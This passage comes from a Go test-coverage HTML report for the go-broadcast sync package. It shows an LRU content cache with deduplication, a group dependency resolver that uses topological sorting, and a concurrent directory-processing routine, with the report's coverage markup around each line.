        entry.AccessedAt = time.Now()
        c.moveToHead(key, contentID)
        content := entry.Content
        c.mu.Unlock()

        c.hits.Add(1)
        c.lastAccessed.Store(time.Now().Unix())

        c.logger.WithFields(logrus.Fields{
                "repo":       repo,
                "branch":     branch,
                "path":       path,
                "content_id": contentID[:8],
                "size":       entry.Size,
        }).Debug("Cache hit")

        return content, true, nil</span>
}

// Put stores content in cache with automatic deduplication and LRU management
func (c *ContentCache) Put(ctx context.Context, repo, branch, path, content string) error <span class="cov8" title="1">{
        if ctx.Err() != nil </span><span class="cov8" title="1">{
                return ctx.Err()
        }</span>

        <span class="cov8" title="1">key := cacheKey{Repo: repo, Branch: branch, Path: path}
        contentID := c.hashContent(content)
        contentSize := int64(len(content))
        now := time.Now()

        c.mu.Lock()
        defer c.mu.Unlock()

        // Check if content already exists (deduplication)
        if existing, exists := c.contents[contentID]; exists </span><span class="cov8" title="1">{
                // Update existing entry's expiration and access time
                existing.ExpiresAt = now.Add(c.ttl)
                existing.AccessedAt = now

                // Update key mapping and LRU position
                c.keyToContentID[key] = contentID
                c.moveToHead(key, contentID)

                c.logger.WithFields(logrus.Fields{
                        "repo":       repo,
                        "branch":     branch,
                        "path":       path,
                        "content_id": contentID[:8],
                        "size":       contentSize,
                }).Debug("Cache put (deduplicated)")

                return nil
        }</span>

        // Check memory limits and evict if necessary
        <span class="cov8" title="1">if err := c.ensureMemoryLimit(contentSize); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to ensure memory limit: %w", err)
        }</span>

        // Create new entry
        <span class="cov8" title="1">entry := &amp;ContentEntry{
                Content:    content,
                Hash:       contentID,
                Size:       contentSize,
                ExpiresAt:  now.Add(c.ttl),
                AccessedAt: now,
                CreatedAt:  now,
        }

        // Store content and update mappings
        c.contents[contentID] = entry
        c.keyToContentID[key] = contentID
        c.addToHead(key, contentID)
        c.currentMemory.Add(contentSize)

        c.logger.WithFields(logrus.Fields{
                "repo":       repo,
                "branch":     branch,
                "path":       path,
                "content_id": contentID[:8],
                "size":       contentSize,
                "memory":     c.currentMemory.Load(),
        }).Debug("Cache put (new)")

        return nil</span>
}

// Invalidate removes all cached entries for a specific repository and branch
func (c *ContentCache) Invalidate(repo, branch string) <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        c.invalidationID.Add(1)
        keysToDelete := make([]cacheKey, 0)

        // Find all keys matching repo and branch
        for key := range c.keyToContentID </span><span class="cov8" title="1">{
                if key.Repo == repo &amp;&amp; key.Branch == branch </span><span class="cov8" title="1">{
                        keysToDelete = append(keysToDelete, key)
                }</span>
        }

        // Remove entries
        <span class="cov8" title="1">for _, key := range keysToDelete </span><span class="cov8" title="1">{
                c.removeKey(key)
        }</span>

        <span class="cov8" title="1">c.logger.WithFields(logrus.Fields{
                "repo":    repo,
                "branch":  branch,
                "removed": len(keysToDelete),
                "memory":  c.currentMemory.Load(),
        }).Info("Cache invalidated")</span>
}

// InvalidateAll clears the entire cache
func (c *ContentCache) InvalidateAll() <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        c.invalidationID.Add(1)
        removedCount := len(c.keyToContentID)

        // Clear all data structures
        c.contents = make(map[string]*ContentEntry)
        c.keyToContentID = make(map[cacheKey]string)
        c.lruHead.next = c.lruTail
        c.lruTail.prev = c.lruHead
        c.currentMemory.Store(0)

        c.logger.WithField("removed", removedCount).Info("Cache invalidated (all)")
}</span>

// GetStats returns current cache statistics
func (c *ContentCache) GetStats() CacheStats <span class="cov8" title="1">{
        hits := c.hits.Load()
        misses := c.misses.Load()
        total := hits + misses

        var hitRate float64
        if total &gt; 0 </span><span class="cov8" title="1">{
                hitRate = float64(hits) / float64(total)
        }</span>

        <span class="cov8" title="1">lastAccessedTime := time.Unix(c.lastAccessed.Load(), 0)
        if c.lastAccessed.Load() == 0 </span><span class="cov8" title="1">{
                lastAccessedTime = c.createdAt
        }</span>

        <span class="cov8" title="1">c.mu.RLock()
        size := int64(len(c.keyToContentID))
        c.mu.RUnlock()

        return CacheStats{
                Hits:           hits,
                Misses:         misses,
                Evictions:      c.evictions.Load(),
                Size:           size,
                MemoryUsage:    c.currentMemory.Load(),
                HitRate:        hitRate,
                LastAccessed:   lastAccessedTime,
                CreatedAt:      c.createdAt,
                InvalidationID: c.invalidationID.Load(),
        }</span>
}

// Warm preloads cache with known files that haven't changed
func (c *ContentCache) Warm(ctx context.Context, repo, branch string, files map[string]string) error <span class="cov8" title="1">{
        if ctx.Err() != nil </span><span class="cov8" title="1">{
                return ctx.Err()
        }</span>

        <span class="cov8" title="1">if len(files) == 0 </span><span class="cov0" title="0">{
                return nil
        }</span>

        <span class="cov8" title="1">warmedCount := 0
        for path, content := range files </span><span class="cov8" title="1">{
                if err := c.Put(ctx, repo, branch, path, content); err != nil </span><span class="cov0" title="0">{
                        c.logger.WithError(err).WithFields(logrus.Fields{
                                "repo":   repo,
                                "branch": branch,
                                "path":   path,
                        }).Warn("Failed to warm cache entry")
                        continue</span>
                }
                <span class="cov8" title="1">warmedCount++

                // Check for cancellation periodically
                if warmedCount%100 == 0 </span><span class="cov0" title="0">{
                        if ctx.Err() != nil </span><span class="cov0" title="0">{
                                return ctx.Err()
                        }</span>
                }
        }

        <span class="cov8" title="1">c.logger.WithFields(logrus.Fields{
                "repo":   repo,
                "branch": branch,
                "warmed": warmedCount,
                "total":  len(files),
                "memory": c.currentMemory.Load(),
        }).Info("Cache warmed")

        return nil</span>
}

// Close stops the cleanup goroutine and releases resources
func (c *ContentCache) Close() error <span class="cov8" title="1">{
        c.cleanupOnce.Do(func() </span><span class="cov8" title="1">{
                close(c.stopCleanup)
        }</span>)
        <span class="cov8" title="1">return nil</span>
}

// hashContent generates SHA256 hash of content for deduplication
func (c *ContentCache) hashContent(content string) string <span class="cov8" title="1">{
        hash := sha256.Sum256([]byte(content))
        return fmt.Sprintf("%x", hash)
}</span>

// ensureMemoryLimit evicts entries if necessary to stay within memory limits
func (c *ContentCache) ensureMemoryLimit(newSize int64) error <span class="cov8" title="1">{
        currentMemory := c.currentMemory.Load()
        if currentMemory+newSize &lt;= c.maxMemoryBytes </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Calculate how much memory we need to free
        <span class="cov8" title="1">targetMemory := c.maxMemoryBytes - newSize
        if targetMemory &lt; 0 </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: content size %d exceeds maximum cache size %d", ErrContentSizeExceedsCache, newSize, c.maxMemoryBytes)
        }</span>

        // Evict LRU entries until we're under the limit
        <span class="cov8" title="1">evicted := 0
        current := c.lruTail.prev

        for current != c.lruHead &amp;&amp; c.currentMemory.Load() &gt; targetMemory </span><span class="cov8" title="1">{
                next := current.prev
                c.removeKey(current.key)
                current = next
                evicted++
        }</span>

        <span class="cov8" title="1">if evicted &gt; 0 </span><span class="cov8" title="1">{
                c.evictions.Add(int64(evicted))
                c.logger.WithFields(logrus.Fields{
                        "evicted":       evicted,
                        "memory_before": currentMemory,
                        "memory_after":  c.currentMemory.Load(),
                        "target_memory": targetMemory,
                }).Debug("LRU eviction completed")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// removeKey removes a key from all data structures
func (c *ContentCache) removeKey(key cacheKey) <span class="cov8" title="1">{
        contentID, exists := c.keyToContentID[key]
        if !exists </span><span class="cov8" title="1">{
                return
        }</span>

        // Remove from key mapping
        <span class="cov8" title="1">delete(c.keyToContentID, key)

        // Check if this content is still referenced by other keys
        stillReferenced := false
        for _, otherContentID := range c.keyToContentID </span><span class="cov8" title="1">{
                if otherContentID == contentID </span><span class="cov0" title="0">{
                        stillReferenced = true
                        break</span>
                }
        }

        // If no other keys reference this content, remove it
        <span class="cov8" title="1">if !stillReferenced </span><span class="cov8" title="1">{
                if entry, exists := c.contents[contentID]; exists </span><span class="cov8" title="1">{
                        c.currentMemory.Add(-entry.Size)
                        delete(c.contents, contentID)
                }</span>
        }

        // Remove from LRU list
        <span class="cov8" title="1">c.removeFromLRU(key)</span>
}

// LRU list management methods

// addToHead adds a new node to the head of the LRU list
func (c *ContentCache) addToHead(key cacheKey, contentID string) <span class="cov8" title="1">{
        node := &amp;lruNode{
                key:       key,
                contentID: contentID,
        }

        node.prev = c.lruHead
        node.next = c.lruHead.next
        c.lruHead.next.prev = node
        c.lruHead.next = node
}</span>

// moveToHead moves an existing node to the head of the LRU list
func (c *ContentCache) moveToHead(key cacheKey, contentID string) <span class="cov8" title="1">{
        c.removeFromLRU(key)
        c.addToHead(key, contentID)
}</span>

// removeFromLRU removes a node from the LRU list
func (c *ContentCache) removeFromLRU(key cacheKey) <span class="cov8" title="1">{
        // Find and remove the node
        current := c.lruHead.next
        for current != c.lruTail </span><span class="cov8" title="1">{
                if current.key == key </span><span class="cov8" title="1">{
                        current.prev.next = current.next
                        current.next.prev = current.prev
                        break</span>
                }
                <span class="cov8" title="1">current = current.next</span>
        }
}

// evictExpired removes expired entries from the cache
func (c *ContentCache) evictExpired() <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        now := time.Now()
        expiredKeys := make([]cacheKey, 0)

        // Find expired keys
        for key, contentID := range c.keyToContentID </span><span class="cov8" title="1">{
                if entry, exists := c.contents[contentID]; exists </span><span class="cov8" title="1">{
                        if now.After(entry.ExpiresAt) </span><span class="cov8" title="1">{
                                expiredKeys = append(expiredKeys, key)
                        }</span>
                }
        }

        // Remove expired keys
        <span class="cov8" title="1">for _, key := range expiredKeys </span><span class="cov8" title="1">{
                c.removeKey(key)
        }</span>

        <span class="cov8" title="1">if len(expiredKeys) &gt; 0 </span><span class="cov8" title="1">{
                c.evictions.Add(int64(len(expiredKeys)))
                c.logger.WithFields(logrus.Fields{
                        "expired": len(expiredKeys),
                        "memory":  c.currentMemory.Load(),
                }).Debug("Expired entries evicted")
        }</span>
}

// cleanup periodically removes expired entries
func (c *ContentCache) cleanup() <span class="cov8" title="1">{
        ticker := time.NewTicker(5 * time.Minute)
        defer ticker.Stop()

        for </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-ticker.C:<span class="cov0" title="0">
                        c.evictExpired()</span>
                case &lt;-c.stopCleanup:<span class="cov8" title="1">
                        return</span>
                }
        }
}
</pre>

		<pre class="file" id="file57" style="display: none">package sync

import (
        "errors"
        "fmt"
        "sort"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/config"
)

// Static errors for dependency resolution
var (
        ErrNonExistentDependency = errors.New("group depends on non-existent group")
        ErrCircularDependency    = errors.New("circular dependency detected")
        ErrTopologicalSort       = errors.New("topological sort failed")
)

// DependencyResolver resolves group dependencies and determines execution order
type DependencyResolver struct {
        groups       map[string]config.Group // Map of group ID to group
        dependencies map[string][]string     // Map of group ID to its dependencies
        logger       *logrus.Logger
}

// NewDependencyResolver creates a new dependency resolver
func NewDependencyResolver(logger *logrus.Logger) *DependencyResolver <span class="cov8" title="1">{
        if logger == nil </span><span class="cov8" title="1">{
                logger = logrus.New()
        }</span>
        <span class="cov8" title="1">return &amp;DependencyResolver{
                groups:       make(map[string]config.Group),
                dependencies: make(map[string][]string),
                logger:       logger,
        }</span>
}

// AddGroup adds a group to the resolver
func (r *DependencyResolver) AddGroup(group config.Group) <span class="cov8" title="1">{
        r.groups[group.ID] = group
        r.dependencies[group.ID] = group.DependsOn
}</span>

// Resolve performs dependency resolution and returns execution order
func (r *DependencyResolver) Resolve() ([]config.Group, error) <span class="cov8" title="1">{
        // First, validate all dependencies exist
        if err := r.validateDependencies(); err != nil </span><span class="cov8" title="1">{
                return nil, err
        }</span>

        // Check for circular dependencies
        <span class="cov8" title="1">if err := r.detectCircularDependencies(); err != nil </span><span class="cov8" title="1">{
                return nil, err
        }</span>

        // Perform topological sort to get execution order
        <span class="cov8" title="1">executionOrder, err := r.topologicalSort()
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        // Within groups at the same dependency level, sort by priority
        <span class="cov8" title="1">r.sortByPriority(executionOrder)

        return executionOrder, nil</span>
}

// validateDependencies ensures all referenced dependencies exist
func (r *DependencyResolver) validateDependencies() error <span class="cov8" title="1">{
        for groupID, deps := range r.dependencies </span><span class="cov8" title="1">{
                for _, depID := range deps </span><span class="cov8" title="1">{
                        if _, exists := r.groups[depID]; !exists </span><span class="cov8" title="1">{
                                return fmt.Errorf("%w: group %q depends on non-existent group %q", ErrNonExistentDependency, groupID, depID)
                        }</span>
                }
        }
        <span class="cov8" title="1">return nil</span>
}

// detectCircularDependencies uses DFS to detect cycles
func (r *DependencyResolver) detectCircularDependencies() error <span class="cov8" title="1">{
        // Track visit states: 0 = unvisited, 1 = visiting, 2 = visited
        visitState := make(map[string]int)

        // Track the path for better error reporting
        var path []string

        // DFS function to detect cycles
        var dfs func(groupID string) error
        dfs = func(groupID string) error </span><span class="cov8" title="1">{
                visitState[groupID] = 1 // Mark as visiting
                path = append(path, groupID)

                for _, depID := range r.dependencies[groupID] </span><span class="cov8" title="1">{
                        switch visitState[depID] </span>{
                        case 1:<span class="cov8" title="1"> // Currently visiting - cycle detected!
                                // Find where the cycle starts
                                cycleStart := -1
                                for i, id := range path </span><span class="cov8" title="1">{
                                        if id == depID </span><span class="cov8" title="1">{
                                                cycleStart = i
                                                break</span>
                                        }
                                }
                                <span class="cov8" title="1">if cycleStart &gt;= 0 </span><span class="cov8" title="1">{
                                        cyclePath := append(path[cycleStart:], depID)
                                        return fmt.Errorf("%w: %v", ErrCircularDependency, cyclePath)
                                }</span>
                                <span class="cov0" title="0">return fmt.Errorf("%w involving group %q", ErrCircularDependency, depID)</span>
                        case 0:<span class="cov8" title="1"> // Unvisited
                                if err := dfs(depID); err != nil </span><span class="cov8" title="1">{
                                        return err
                                }</span>
                        }
                        // case 2: Already visited, skip
                }

                <span class="cov8" title="1">visitState[groupID] = 2   // Mark as visited
                path = path[:len(path)-1] // Remove from path
                return nil</span>
        }

        // Check all groups
        <span class="cov8" title="1">for groupID := range r.groups </span><span class="cov8" title="1">{
                if visitState[groupID] == 0 </span><span class="cov8" title="1">{
                        if err := dfs(groupID); err != nil </span><span class="cov8" title="1">{
                                return err
                        }</span>
                }
        }

        <span class="cov8" title="1">return nil</span>
}

// topologicalSort performs Kahn's algorithm for topological sorting
func (r *DependencyResolver) topologicalSort() ([]config.Group, error) <span class="cov8" title="1">{
        // Calculate in-degree for each node
        // In-degree is the number of groups that depend on this group
        inDegree := make(map[string]int)
        for groupID := range r.groups </span><span class="cov8" title="1">{
                inDegree[groupID] = 0
        }</span>

        // For each group that has dependencies, increase the in-degree of the current group
        // (not the dependencies themselves)
        <span class="cov8" title="1">for groupID, deps := range r.dependencies </span><span class="cov8" title="1">{
                // This group depends on deps, so increase this group's in-degree by the number of its dependencies
                inDegree[groupID] = len(deps)
        }</span>

        // Find all nodes with in-degree 0
        <span class="cov8" title="1">var queue []string
        for groupID, degree := range inDegree </span><span class="cov8" title="1">{
                if degree == 0 </span><span class="cov8" title="1">{
                        queue = append(queue, groupID)
                }</span>
        }

        // Sort initial queue by priority for deterministic ordering
        <span class="cov8" title="1">sort.Slice(queue, func(i, j int) bool </span><span class="cov8" title="1">{
                gi := r.groups[queue[i]]
                gj := r.groups[queue[j]]
                if gi.Priority != gj.Priority </span><span class="cov8" title="1">{
                        return gi.Priority &lt; gj.Priority
                }</span>
                // If same priority, sort by ID for deterministic order
                <span class="cov8" title="1">return gi.ID &lt; gj.ID</span>
        })

        // Process queue
        <span class="cov8" title="1">var result []config.Group
        processedCount := 0

        for len(queue) &gt; 0 </span><span class="cov8" title="1">{
                // Pop from queue
                current := queue[0]
                queue = queue[1:]

                // Add to result
                result = append(result, r.groups[current])
                processedCount++

                // For each group that depends on the current group, reduce its in-degree
                for groupID, deps := range r.dependencies </span><span class="cov8" title="1">{
                        for _, depID := range deps </span><span class="cov8" title="1">{
                                if depID == current </span><span class="cov8" title="1">{
                                        // groupID depends on current, and current is now processed
                                        inDegree[groupID]--
                                        if inDegree[groupID] == 0 </span><span class="cov8" title="1">{
                                                // All dependencies of groupID are now processed
                                                queue = append(queue, groupID)
                                        }</span>
                                }
                        }
                }

                // Sort queue by priority for next iteration
                <span class="cov8" title="1">if len(queue) &gt; 1 </span><span class="cov8" title="1">{
                        sort.Slice(queue, func(i, j int) bool </span><span class="cov8" title="1">{
                                gi := r.groups[queue[i]]
                                gj := r.groups[queue[j]]
                                if gi.Priority != gj.Priority </span><span class="cov8" title="1">{
                                        return gi.Priority &lt; gj.Priority
                                }</span>
                                <span class="cov8" title="1">return gi.ID &lt; gj.ID</span>
                        })
                }
        }

        // Check if all nodes were processed (should be true if no cycles)
        <span class="cov8" title="1">if processedCount != len(r.groups) </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("%w: processed %d groups out of %d",
                        ErrTopologicalSort, processedCount, len(r.groups))
        }</span>

        <span class="cov8" title="1">return result, nil</span>
}

// sortByPriority sorts groups by priority within dependency levels
func (r *DependencyResolver) sortByPriority(groups []config.Group) <span class="cov8" title="1">{
        // Groups are already sorted by priority within dependency levels
        // due to the priority-aware queue processing in topologicalSort
        // This method is kept for clarity and potential future enhancements

        r.logger.WithField("group_count", len(groups)).Debug("Execution order determined")
        for i, group := range groups </span><span class="cov8" title="1">{
                r.logger.WithFields(logrus.Fields{
                        "order":      i + 1,
                        "group_id":   group.ID,
                        "group_name": group.Name,
                        "priority":   group.Priority,
                        "depends_on": group.DependsOn,
                }).Debug("Group execution order")
        }</span>
}

// GetDependencyGraph returns a string representation of the dependency graph (for debugging)
func (r *DependencyResolver) GetDependencyGraph() string <span class="cov8" title="1">{
        result := "Dependency Graph:\n"
        for groupID, deps := range r.dependencies </span><span class="cov8" title="1">{
                group := r.groups[groupID]
                result += fmt.Sprintf("  %s (priority=%d)", groupID, group.Priority)
                if len(deps) &gt; 0 </span><span class="cov8" title="1">{
                        result += fmt.Sprintf(" ‚Üí %v", deps)
                }</span>
                <span class="cov8" title="1">result += "\n"</span>
        }
        <span class="cov8" title="1">return result</span>
}
</pre>

		<pre class="file" id="file58" style="display: none">package sync

import (
        "context"
        "errors"
        "fmt"
        "io/fs"
        "os"
        "path/filepath"
        "strings"
        "sync"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/config"
        internalerrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/metrics"
        "github.com/mrz1836/go-broadcast/internal/state"
)

// Static error variables
var (
        ErrSourceDirectoryNotExist      = errors.New("source directory does not exist")
        ErrAllDirectoryProcessingFailed = errors.New("all directory processing failed")
        ErrSourceDirectoryEmpty         = errors.New("source directory cannot be empty")
        ErrDestinationDirectoryEmpty    = errors.New("destination directory cannot be empty")
        ErrEmptyExclusionPattern        = errors.New("empty exclusion pattern not allowed")
        ErrUnsupportedModuleType        = errors.New("unsupported module type")
)

// DirectoryProcessor handles concurrent directory processing with worker pools
type DirectoryProcessor struct {
        exclusionEngine *ExclusionEngine
        progressManager *DirectoryProgressManager
        workerCount     int
        logger          *logrus.Entry
        moduleDetector  *ModuleDetector
        moduleResolver  *ModuleResolver
        moduleCache     *ModuleCache
}

// NewDirectoryProcessor creates a new directory processor
func NewDirectoryProcessor(logger *logrus.Entry, workerCount int) *DirectoryProcessor <span class="cov8" title="1">{
        if workerCount &lt;= 0 </span><span class="cov0" title="0">{
                workerCount = 10 // Default worker count
        }</span>

        // Create module components with default settings
        <span class="cov8" title="1">moduleCache := NewModuleCache(5*time.Minute, logger.Logger)
        moduleDetector := NewModuleDetector(logger.Logger)
        moduleResolver := NewModuleResolver(logger.Logger, moduleCache)

        return &amp;DirectoryProcessor{
                progressManager: NewDirectoryProgressManager(logger),
                workerCount:     workerCount,
                logger:          logger,
                moduleDetector:  moduleDetector,
                moduleResolver:  moduleResolver,
                moduleCache:     moduleCache,
        }</span>
}

// Close shuts down the directory processor and cleans up resources
func (dp *DirectoryProcessor) Close() <span class="cov8" title="1">{
        if dp.moduleCache != nil </span><span class="cov8" title="1">{
                dp.moduleCache.Close()
        }</span>
}

// processDirectories processes directory mappings for the RepositorySync
func (rs *RepositorySync) processDirectories(ctx context.Context) ([]FileChange, error) <span class="cov0" title="0">{
        if len(rs.target.Directories) == 0 </span><span class="cov0" title="0">{
                rs.logger.Debug("No directories configured for sync")
                return nil, nil
        }</span>

        // Check for context cancellation early
        <span class="cov0" title="0">if err := ctx.Err(); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("context canceled before directory processing: %w", err)
        }</span>

        <span class="cov0" title="0">processTimer := metrics.StartTimer(ctx, rs.logger, "directory_processing").
                AddField("directory_count", len(rs.target.Directories))

        rs.logger.WithField("directory_count", len(rs.target.Directories)).Info("Processing directories")

        // Create directory processor
        processor := NewDirectoryProcessor(rs.logger, 10) // Use default worker count
        defer processor.Close()

        sourcePath := filepath.Join(rs.tempDir, "source")

        // Verify source path exists
        if _, err := os.Stat(sourcePath); os.IsNotExist(err) </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("%w: %s", ErrSourceDirectoryNotExist, sourcePath)
        }</span>

        <span class="cov0" title="0">var allChanges []FileChange
        var processingErrors []error

        // Process each directory mapping
        for _, dirMapping := range rs.target.Directories </span><span class="cov0" title="0">{
                // Check for context cancellation during processing
                if err := ctx.Err(); err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("context canceled during directory processing: %w", err)
                }</span>

                <span class="cov0" title="0">changes, err := processor.ProcessDirectoryMapping(ctx, sourcePath, dirMapping, rs.target, rs.sourceState, rs.engine)
                if err != nil </span><span class="cov0" title="0">{
                        // Log error and collect for potential failure decision
                        rs.logger.WithError(err).WithField("directory", dirMapping.Src).Error("Failed to process directory")
                        processingErrors = append(processingErrors, err)
                        continue</span>
                }
                <span class="cov0" title="0">allChanges = append(allChanges, changes...)</span>
        }

        // If all directories failed, return an error
        <span class="cov0" title="0">if len(processingErrors) &gt; 0 &amp;&amp; len(allChanges) == 0 </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("%w: %d errors occurred", ErrAllDirectoryProcessingFailed, len(processingErrors))
        }</span>

        <span class="cov0" title="0">processTimer.AddField("total_changes", len(allChanges)).Stop()

        rs.logger.WithField("total_changes", len(allChanges)).Info("Directory processing completed")
        return allChanges, nil</span>
}

// ProcessDirectoryMapping processes a single directory mapping
func (dp *DirectoryProcessor) ProcessDirectoryMapping(ctx context.Context, sourcePath string, dirMapping config.DirectoryMapping, target config.TargetConfig, sourceState *state.SourceState, engine *Engine) ([]FileChange, error) <span class="cov8" title="1">{
        logger := dp.logger.WithFields(logrus.Fields{
                "src_dir":  dirMapping.Src,
                "dest_dir": dirMapping.Dest,
        })

        logger.Info("Processing directory mapping")

        // Create exclusion engine with directory-specific patterns
        dp.exclusionEngine = NewExclusionEngineWithIncludes(dirMapping.Exclude, dirMapping.IncludeOnly)

        // Build full source directory path
        fullSourceDir := filepath.Join(sourcePath, dirMapping.Src)

        // Check if source directory exists
        if _, err := os.Stat(fullSourceDir); os.IsNotExist(err) </span><span class="cov0" title="0">{
                logger.Warn("Source directory not found, skipping")
                return nil, internalerrors.ErrFileNotFound
        }</span>

        // Handle module-aware sync if configured
        <span class="cov8" title="1">if dirMapping.Module != nil </span><span class="cov0" title="0">{
                if err := dp.handleModuleSync(ctx, fullSourceDir, dirMapping.Module, logger); err != nil </span><span class="cov0" title="0">{
                        logger.WithError(err).Warn("Module sync handling failed, continuing with standard sync")
                        // Continue with standard sync if module handling fails
                }</span> else<span class="cov0" title="0"> {
                        logger.WithField("module_type", dirMapping.Module.Type).Debug("Module sync configuration applied")
                }</span>
        }

        // Discover files in the directory
        <span class="cov8" title="1">files, err := dp.discoverFiles(ctx, fullSourceDir, dirMapping)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to discover files in directory %s: %w", dirMapping.Src, err)
        }</span>

        <span class="cov8" title="1">if len(files) == 0 </span><span class="cov8" title="1">{
                logger.Info("No files found in directory")
                return nil, nil
        }</span>

        // Create progress reporter
        <span class="cov8" title="1">progressReporter := dp.progressManager.GetReporter(dirMapping.Src, 50)
        progressReporter.Start(len(files))

        // Convert discovered files to processing jobs
        jobs := dp.createFileJobs(files, dirMapping)

        // Process files using batch processor
        batchProcessor := NewBatchProcessor(engine, target, sourceState, logger, dp.workerCount)

        // Use progress wrapper for batch processing
        progressWrapper := NewBatchProgressWrapper(progressReporter)
        changes, err := batchProcessor.ProcessFilesWithProgress(ctx, sourcePath, jobs, progressWrapper)
        if err != nil </span><span class="cov0" title="0">{
                progressReporter.Complete()
                return nil, fmt.Errorf("failed to process files in directory %s: %w", dirMapping.Src, err)
        }</span>

        // Complete progress reporting
        <span class="cov8" title="1">directoryMetrics := progressReporter.Complete()

        logger.WithFields(logrus.Fields{
                "files_discovered":          directoryMetrics.FilesDiscovered,
                "files_processed":           directoryMetrics.FilesProcessed,
                "files_excluded":            directoryMetrics.FilesExcluded,
                "binary_files_skipped":      directoryMetrics.BinaryFilesSkipped,
                "binary_files_size_bytes":   directoryMetrics.BinaryFilesSize,
                "transform_errors":          directoryMetrics.TransformErrors,
                "transform_successes":       directoryMetrics.TransformSuccesses,
                "avg_transform_duration_ms": progressReporter.GetAverageTransformDuration().Milliseconds(),
                "changes":                   len(changes),
        }).Info("Directory mapping processed successfully")

        return changes, nil</span>
}

// No need for sourceState interface since we're using state.SourceState directly

// DiscoveredFile represents a file discovered during directory traversal
type DiscoveredFile struct {
        RelativePath string // Path relative to the source directory
        FullPath     string // Full filesystem path
        Size         int64  // File size in bytes
        IsDir        bool   // Whether this is a directory
}

// discoverFiles walks the directory tree and discovers files to process
func (dp *DirectoryProcessor) discoverFiles(ctx context.Context, sourceDir string, dirMapping config.DirectoryMapping) ([]DiscoveredFile, error) <span class="cov8" title="1">{
        var files []DiscoveredFile
        var mu sync.Mutex

        // Determine if hidden files should be included
        includeHidden := true
        if dirMapping.IncludeHidden != nil </span><span class="cov8" title="1">{
                includeHidden = *dirMapping.IncludeHidden
        }</span>

        // Walk the directory tree
        <span class="cov8" title="1">err := filepath.WalkDir(sourceDir, func(path string, d fs.DirEntry, err error) error </span><span class="cov8" title="1">{
                // Handle context cancellation
                select </span>{
                case &lt;-ctx.Done():<span class="cov0" title="0">
                        return ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }

                <span class="cov8" title="1">if err != nil </span><span class="cov0" title="0">{
                        dp.logger.WithError(err).WithField("path", path).Warn("Error walking directory path")
                        return nil // Continue walking other paths
                }</span>

                // Calculate relative path from source directory
                <span class="cov8" title="1">relPath, err := filepath.Rel(sourceDir, path)
                if err != nil </span><span class="cov0" title="0">{
                        dp.logger.WithError(err).WithField("path", path).Warn("Failed to calculate relative path")
                        return nil
                }</span>

                // Skip the root directory itself
                <span class="cov8" title="1">if relPath == "." </span><span class="cov8" title="1">{
                        return nil
                }</span>

                // Check for hidden files/directories
                <span class="cov8" title="1">if !includeHidden &amp;&amp; dp.isHidden(relPath) </span><span class="cov8" title="1">{
                        if d.IsDir() </span><span class="cov8" title="1">{
                                return filepath.SkipDir // Skip entire hidden directory
                        }</span>
                        <span class="cov8" title="1">return nil</span> // Skip hidden file
                }

                // Early exclusion check for directories to avoid walking excluded trees
                <span class="cov8" title="1">if d.IsDir() </span><span class="cov8" title="1">{
                        if dp.exclusionEngine.IsDirectoryExcluded(relPath) </span><span class="cov8" title="1">{
                                dp.logger.WithField("directory", relPath).Debug("Directory excluded by patterns")
                                return filepath.SkipDir
                        }</span>
                        // Record directory traversal for metrics
                        <span class="cov8" title="1">dp.progressManager.GetReporter(dirMapping.Src, 50).RecordDirectoryWalked()
                        return nil</span> // Continue walking this directory
                }

                // Check if file should be excluded
                <span class="cov8" title="1">if dp.exclusionEngine.IsExcluded(relPath) </span><span class="cov8" title="1">{
                        dp.logger.WithField("file", relPath).Debug("File excluded by patterns")
                        dp.progressManager.GetReporter(dirMapping.Src, 50).RecordFileExcluded()
                        return nil
                }</span>

                // Get file info for size
                <span class="cov8" title="1">info, err := d.Info()
                if err != nil </span><span class="cov0" title="0">{
                        dp.logger.WithError(err).WithField("file", relPath).Warn("Failed to get file info")
                        return nil
                }</span>

                // Add to discovered files
                <span class="cov8" title="1">mu.Lock()
                files = append(files, DiscoveredFile{
                        RelativePath: relPath,
                        FullPath:     path,
                        Size:         info.Size(),
                        IsDir:        d.IsDir(),
                })
                mu.Unlock()

                // Update progress metrics
                progressReporter := dp.progressManager.GetReporter(dirMapping.Src, 50)
                progressReporter.RecordFileDiscovered()
                progressReporter.AddTotalSize(info.Size())

                return nil</span>
        })
        <span class="cov8" title="1">if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to walk directory %s: %w", sourceDir, err)
        }</span>

        <span class="cov8" title="1">dp.logger.WithFields(logrus.Fields{
                "directory":        sourceDir,
                "files_discovered": len(files),
        }).Debug("Directory discovery completed")

        return files, nil</span>
}

// createFileJobs converts discovered files into processing jobs with directory-specific metadata
func (dp *DirectoryProcessor) createFileJobs(files []DiscoveredFile, dirMapping config.DirectoryMapping) []FileJob <span class="cov8" title="1">{
        // First, count non-directory files to get total count
        totalFiles := 0
        for _, file := range files </span><span class="cov8" title="1">{
                if !file.IsDir </span><span class="cov8" title="1">{
                        totalFiles++
                }</span>
        }

        <span class="cov8" title="1">jobs := make([]FileJob, 0, totalFiles)
        fileIndex := 0

        for _, file := range files </span><span class="cov8" title="1">{
                // Skip directories
                if file.IsDir </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Determine destination path
                <span class="cov8" title="1">destPath := dp.calculateDestinationPath(file.RelativePath, dirMapping)

                // Create directory-aware job using the new helper function
                job := NewDirectoryFileJob(
